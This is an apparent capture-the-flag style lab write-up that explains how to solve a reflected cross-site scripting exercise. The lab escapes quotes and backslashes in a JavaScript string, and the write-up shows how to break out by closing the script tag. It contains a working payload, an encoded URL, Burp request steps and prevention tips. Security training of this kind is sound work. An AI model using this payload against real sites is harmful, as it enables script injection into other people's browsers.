# Lab 18: Reflected XSS into a JavaScript string with single quote and backslash escaped

**Goal**: Break out of an inline `<script>` tag context to execute `alert(1)` when single quotes (`'`) and backslashes (`\`) are escaped inside a JavaScript string.

This lab contains a reflected cross-site scripting vulnerability in the search feature. Input is reflected inside a single-quoted JavaScript string literal. The application escapes single quotes and backslashes, preventing string literal breakout (`'`). However, angle brackets (`<`, `>`) are **NOT** escaped, allowing us to close the parent `<script>` tag directly!

---

## 🎯 Solution

1. Test input reflection in Burp Suite Repeater:
   ```javascript
   var searchTerms = 'test123';
   ```
2. Observe that single quotes `'` become `\'`, preventing string breakout.
3. Inject a closing `</script>` tag payload:
   ```html
   </script><script>alert(1)</script>
   ```
4. Load the URL in the browser to trigger `alert(1)`.

![Lab 18 Closing Script Tag Payload](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-26%20173206.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Probe Search Input & Intercept Request
Submit a search query (e.g., `test123`) in the search field. Intercept the request in Burp Proxy and send it to **Repeater**:

```http
GET /?search=test123 HTTP/2
Host: your-lab-id.web-security-academy.net
```

### Step 2: Test Quote & Backslash Escaping
Send `test'payload\` in Burp Repeater and inspect the response:

```javascript
var searchTerms = 'test\'payload\\';
```

- Single quote `'` is escaped as `\'`.
- Backslash `\` is escaped as `\\`.

Because quote escaping prevents breaking out of the JavaScript string `'...'`, we cannot use quote-based payloads like `'-alert(1)-'`.

### Step 3: Inject HTML Script Closing Tag
Notice that angle brackets (`<`, `>`) are **NOT** escaped or filtered inside the `<script>` block.

When the HTML parser encounters `</script>`, it immediately terminates the current script block regardless of JavaScript string literal quotes!

Construct the tag breakout payload:

```html
</script><script>alert(1)</script>
```

When injected, the resulting page source becomes:

```html
<script>
    var searchTerms = '</script><script>alert(1)</script>';
    trackSearch(searchTerms);
</script>
```

#### Parsing Behavior:
1. The HTML parser encounters `</script>` inside the string and closes the initial script element.
2. It then parses the new `<script>alert(1)</script>` block and executes `alert(1)`.

### Step 4: Verify Payload Execution
Load the crafted URL in the browser:

```http
/?search=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
```

![Lab 18 Solved Confirmation](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-26%20173225.png)

> [!SUCCESS]
> **Lab Solved**: Successfully executed `alert(1)` by closing the `<script>` tag!

---

## 💡 Key Takeaways: HTML Parser Priority over JS Tokenizer

- **HTML Parser Priority**: The browser's HTML parser runs **before** the JavaScript tokenizer. When rendering an inline `<script>` element, encountering `</script>` terminates the script block even if it appears inside a JavaScript string literal (`'...</script>...'`).
- **Incomplete Escaping**: Escaping quotes within script blocks is ineffective if HTML tag characters (`<`, `>`) remain unescaped.

---

## 🔒 Prevention

> [!TIP]
> 1. **HTML Entity Encoding**: Encode angle brackets (`<` to `&lt;`, `>` to `&gt;`) even when reflecting input inside inline JavaScript script blocks.
> 2. **Avoid Inline Scripts**: Use external JavaScript files and pass data via safe JSON attributes (`data-*`).
